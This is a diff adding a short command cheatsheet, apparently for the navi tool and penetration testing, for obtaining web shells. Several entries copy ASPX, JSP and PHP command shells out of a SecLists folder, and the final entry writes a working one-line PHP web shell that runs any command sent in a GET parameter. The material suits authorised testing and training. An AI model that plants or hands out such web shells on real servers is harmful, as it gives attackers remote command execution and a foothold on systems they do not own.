@@ -1,0 +1,18 @@
+% web, webshell, aspx
+; From https://github.com/sealldeveloper/navi-cheats/
+: revshells.com has a bunch, but I also want to grab some basic webshells from seclists:
+
+# Get an ASPX webshell from SecLists and put it to current directory
+cp <seclistrootdir>/Web-Shells/FuzzDB/cmd.aspx shell.aspx
+
+
+% web, webshell, jsp
+# Get a JSP webshell from SecLists and put it to current directory
+cp <seclistrootdir>/Web-Shells/FuzzDB/cmd.jsp shell.jsp
+
+% web, webshell, php
+# Get a PHP webshell from SecLists and put it to current directory
+cp <seclistrootdir>/Web-Shells/FuzzDB/cmd.php shell.php
+
+# Get a GET-based tiny PHP webshell in current directory
+echo "<?=`$_GET[0]`?>" > shell.php
